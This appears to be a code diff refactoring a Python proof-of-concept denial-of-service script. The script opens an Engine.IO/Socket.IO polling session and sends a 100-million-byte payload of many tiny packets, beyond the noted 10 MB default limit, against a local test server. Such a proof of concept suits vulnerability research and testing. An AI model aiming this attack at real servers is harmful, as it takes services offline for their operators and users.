@@ -4,6 +4,9 @@ import time
 import requests
 
 
+DEFAULT_MAX = 100000000
+
+
 def repeat_packet(packet, total_length):
     repetitions = total_length // len(packet)
     return packet * repetitions
@@ -54,15 +57,18 @@ def timestr():
     return "&t=" + str(time.time())
 
 
-def attack(host, payload_length=100000000, make_payload=many_tiny_packets):
-    # engineio default max length is 10 meg
+def get_new_session_url(host):
     base_url = host + "/socket.io/?EIO=3&transport=polling"
     # Create session
     response = requests.get(base_url + timestr()).text
     print("Response from server", repr(response))
     sid = re.search("\"sid\":\"([^\"]+)\"", response).group(1)
     print("Got session", sid)
-    session_url = base_url + "&sid=" + sid
+    return base_url + "&sid=" + sid
+
+
+def attack(host, payload_length=DEFAULT_MAX, make_payload=many_tiny_packets):
+    session_url = get_new_session_url(host)
     # Fire payload
     payload = make_payload(payload_length)
     print("Firing payload of length", len(payload), repr(payload[:100]))
@@ -98,5 +104,5 @@ def get_responses(host, sid):
     print("Server returned", repr(final_response))
 
 
-def x(payload_length=100000000, make_payload=many_tiny_packets):
+def x(payload_length=DEFAULT_MAX, make_payload=many_tiny_packets):
     return attack("http://127.0.0.1:5000", payload_length, make_payload)
